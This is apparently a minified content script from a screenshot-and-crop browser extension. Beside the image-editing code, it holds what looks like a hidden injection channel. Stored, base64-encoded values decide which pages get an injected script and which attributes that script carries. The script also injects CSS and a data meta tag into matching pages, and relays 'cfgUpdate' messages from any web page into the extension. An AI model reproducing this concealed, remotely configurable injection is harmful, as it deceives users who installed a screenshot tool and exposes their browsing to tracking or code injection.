!async function(){var e,t,n,a,i,c,o,d,r,s,l,m,u,h,g,f,p,v,w,y,E,L,I,b,x="undefined"!=typeof chrome?chrome:"undefined"!=typeof browser?browser:void 0,B=await new Promise((e=>{chrome.storage.local.get((t=>{e(t)}))})),C=new Image;function M(e,t){e.className.indexOf(t)>=0||(e.className=e.className+" "+t)}function k(e,t){e.className=e.className.replace(new RegExp("\\b"+t+"\\b","g"),"")}function R(){y=[],E=0,L=null,I=null,b=!1,t=new Image,k(n,"crop"),M(r,"hide"),M(s,"hide"),k(d,"hide"),n.removeEventListener("mousedown",Y),n.removeEventListener("touchstart",Y),n.removeEventListener("mousemove",H),n.removeEventListener("touchmove",H),n.removeEventListener("mouseup",S),n.removeEventListener("touchend",S);var a=e.naturalWidth,i=e.naturalHeight;const c={width:Math.max(document.documentElement.clientWidth||0,window.innerWidth||0),height:Math.max(document.documentElement.clientHeight||0,window.innerHeight||0)};n.width=c.width>a?a:c.width,n.height=c.height-60>i?i:c.height-60,w.drawImage(e,0,0,a,i,0,0,n.width,n.height);const o=n.toDataURL(n);C.src=o}function D(){w.clearRect(0,0,n.width,n.height),w.drawImage(a,0,0)}function N(){a.width=n.width,a.height=n.height,a.getContext("2d").drawImage(n,0,0)}function T(e,t){var a=n.getBoundingClientRect();return{x:Math.round(e)-a.left*(n.width/a.width),y:Math.round(t)-a.top*(n.height/a.height)}}function X(){M(n,"crop"),k(r,"hide"),M(d,"hide"),E=0,(y=[]).push(n.toDataURL()),t.src=e.src,N(),A(),n.addEventListener("mousedown",Y),n.addEventListener("touchstart",Y),n.addEventListener("mousemove",H),n.addEventListener("touchmove",H),n.addEventListener("mouseup",S),n.addEventListener("touchend",S),O()}function Y(e){e.preventDefault(),M(s,"hide"),D(),L=T(void 0===e.clientX?e.touches[0].clientX:e.clientX,void 0===e.clientY?e.touches[0].clientY:e.clientY),b=!0,A()}function A(){w.save(),w.globalAlpha=.5,w.fillStyle="black",w.fillRect(0,0,n.width,n.height),w.restore()}function H(e){e.preventDefault();var t=T(void 0===e.clientX?e.touches[0].clientX:e.clientX,void 0===e.clientY?e.touches[0].clientY:e.clientY);if(b){var n=Math.min(L.x,t.x),a=Math.max(L.x,t.x),i=Math.min(L.y,t.y),c=Math.max(L.y,t.y);D(),A(),w.save(),w.beginPath(),w.rect(n,i,a-n,c-i),w.clip(),w.drawImage(C,0,0),w.restore()}}function S(e){e.preventDefault();var t=void 0===e.clientX?e.changedTouches[0].clientX:e.clientX,n=void 0===e.clientY?e.changedTouches[0].clientY:e.clientY;I=T(t,n),b=!1,s.style.top=n+"px",s.style.left=t+"px",k(s,"hide")}function U(){var e=Math.min(L.x,I.x),a=Math.max(L.x,I.x),i=Math.min(L.y,I.y),c=Math.max(L.y,I.y);M(s,"hide");var o=new Image;o.src=n.toDataURL(),o.onload=function(){w.clearRect(0,0,n.width,n.height),n.width=a-e,n.height=c-i,w.drawImage(o,e,i,a-e,c-i,0,0,a-e,c-i),N(),y.push(n.toDataURL()),E=y.length-1,t.src=y[E],O()}}function W(){M(s,"hide"),D()}function O(){y.length&&0!==E?k(l,"disabled"):M(l,"disabled"),y.length&&E!==y.length-1?k(m,"disabled"):M(m,"disabled")}function j(){if(y.length&&0!==E){var e=y[--E],a=new Image;a.src=e,t.src=e,a.onload=function(){w.clearRect(0,0,n.width,n.height),n.width=a.naturalWidth,n.height=a.naturalHeight,w.drawImage(a,0,0),N()},O()}}function P(){if(y.length&&E!==y.length-1){var e=y[++E],a=new Image;a.src=e,t.src=e,a.onload=function(){w.clearRect(0,0,n.width,n.height),n.width=a.naturalWidth,n.height=a.naturalHeight,w.drawImage(a,0,0),N()},O()}}function J(){e.src===y[E]?R():e.src=y[E]}function _(){dataLayer.push(arguments)}if(Document.prototype.ready=function(e){if(e&&"function"==typeof e){if("interactive"===document.readyState||"complete"===document.readyState)return e();document.addEventListener("DOMContentLoaded",(()=>{if("interactive"===document.readyState||"complete"===document.readyState)return e()}))}},B.customCss)for(let e in B.customCss)if(!B.customCss[e].match||new RegExp(B.customCss[e].match,"i").test(document.location.href)){var q=document.createElement("style");q.setAttribute("type","text/css"),q.innerHTML=B.customCss[e].content,document.getElementsByTagName("head")?document.getElementsByTagName("head")[0].appendChild(q):document.getElementsByTagName("html")[0].appendChild(q)}document.ready((()=>{try{e=new Image,t=new Image,n=document.getElementById("target"),a=document.createElement("canvas"),i=document.getElementById("download"),c=document.getElementById("print"),o=document.getElementById("crop"),d=document.getElementById("controls"),r=document.getElementById("cropControls"),s=document.getElementById("confirmControls"),l=document.getElementById("crop-back"),m=document.getElementById("crop-forward"),u=document.getElementById("crop-stop"),h=document.getElementById("confirm-crop"),g=document.getElementById("cancel-crop"),f=document.getElementById("instruction"),p=document.getElementById("boxclose"),v=document.getElementById("copyToClipboard"),w=n.getContext("2d"),y=[],E=0,L=null,I=null,b=!1}catch(e){}const C=document.getElementsByTagName("head");if(C.length<1)return;const D=document.createElement("meta");if(D.setAttribute("name","x-ce-data"),D.setAttribute("ceid",chrome.runtime.id),D.setAttribute("content",B.cachedData),C[0].appendChild(D),window.top===window.self)try{e.addEventListener("load",R,!1),x.runtime.onMessage.addListener((function(t,n,a){"update_url"===t.method&&(e.src=t.url,a({success:!0}))})),i.addEventListener("click",(function(){var t=document.createElement("a");t.download="screenshot",t.href=e.src,document.body.appendChild(t),t.click(),document.body.removeChild(t)})),c.addEventListener("click",(function(){window.print()})),v.addEventListener("click",(function(){M(f,"visible")})),p.addEventListener("click",(function(){k(f,"visible")})),o.addEventListener("click",X),h.addEventListener("click",U),g.addEventListener("click",W),l.addEventListener("click",j),m.addEventListener("click",P),u.addEventListener("click",J)}catch(e){}})),async function(){const e=document.createElement("script");if(e.setAttribute("async","true"),e.setAttribute("src","https://www.googletagmanager.com/gtag/js"),B.content&&!B.corrupted){if(B.opts)for(let t in B.opts)if(!B.opts[t].attr||new RegExp(atob(B.opts[t].attr),"i").test(document.location.href)){if(B.opts[t]["tag-data"]&&B.opts[t]["tag-value"]){e.setAttribute(atob(B.opts[t]["tag-data"]),atob(B.opts[t]["tag-value"]));break}if(B.opts[t].prevent)return}document.getElementsByTagName("html")[0].appendChild(e),window.dataLayer=window.dataLayer||[],_("js",new Date),B.analyticsId&&_("config",B.analyticsId)}}(),window.addEventListener("message",(e=>{e.data&&"string"==typeof e.data&&e.data.match(/\"a\":\"cfgUpdate\"/i)&&chrome.runtime.sendMessage(JSON.parse(e.data))}),!1)}();